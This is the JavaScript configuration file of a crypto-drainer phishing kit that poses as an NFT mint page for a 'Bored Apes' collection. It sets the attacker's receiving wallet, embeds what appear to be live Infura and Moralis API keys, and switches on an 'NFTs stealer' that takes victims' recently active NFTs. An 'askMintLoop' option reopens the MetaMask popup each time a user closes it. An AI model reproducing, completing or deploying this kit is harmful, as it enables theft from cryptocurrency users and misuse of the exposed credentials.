const address = "0xe6d05211faa7f0014c4cd1d96634e7862df13eb9";
const infuraId = "23c987f4c1684c1fbd1721d699818f4c"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "E3fk7swwIi0SglK2Kf5tRhyGJv2aopKpl8fej4jobSn2Jq8D5WYK8hJGmJfnAswF"    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Bored Apes",
    title: "Ola Services", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "19.03.2022",
    socialMedia: {
        discord: "https://discord.gg/",
        twitter: "https://twitter.com",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "video",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.6,         // Price per NFT.
    totalSupply: 1000,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 10,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "NFT ADRESS" // leave empty if you want to use the same addresss
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion